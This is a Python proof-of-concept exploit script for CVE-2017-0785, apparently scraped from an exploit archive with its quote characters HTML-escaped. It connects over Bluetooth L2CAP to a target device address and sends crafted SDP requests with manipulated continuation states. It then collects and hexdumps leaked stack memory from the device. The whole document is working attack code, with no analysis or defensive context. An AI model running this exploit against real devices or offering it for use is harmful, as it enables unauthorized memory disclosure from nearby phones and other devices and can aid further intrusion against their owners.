import bluetooth
 
if not &#039;TARGET&#039; in args:
    log.info("Usage: CVE-2017-0785.py TARGET=XX:XX:XX:XX:XX:XX")
    exit()
 
target = args[&#039;TARGET&#039;]
service_long = 0x0100
service_short = 0x0001
mtu = 50
n = 30
 
def packet(service, continuation_state):
    pkt = &#039;\x02\x00\x00&#039;
    pkt += p16(7 + len(continuation_state))
    pkt += &#039;\x35\x03\x19&#039;
    pkt += p16(service)
    pkt += &#039;\x01\x00&#039;
    pkt += continuation_state
    return pkt
 
p = log.progress(&#039;Exploit&#039;)
p.status(&#039;Creating L2CAP socket&#039;)
 
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)
context.endian = &#039;big&#039;
 
p.status(&#039;Connecting to target&#039;)
sock.connect((target, 1))
 
p.status(&#039;Sending packet 0&#039;)
sock.send(packet(service_long, &#039;\x00&#039;))
data = sock.recv(mtu)
 
if data[-3] != &#039;\x02&#039;:
    log.error(&#039;Invalid continuation state received.&#039;)
 
stack = &#039;&#039;
 
for i in range(1, n):
    p.status(&#039;Sending packet %d&#039; % i)
    sock.send(packet(service_short, data[-3:]))
    data = sock.recv(mtu)
    stack += data[9:-3]
 
sock.close()
 
p.success(&#039;Done&#039;)
 
print hexdump(stack)

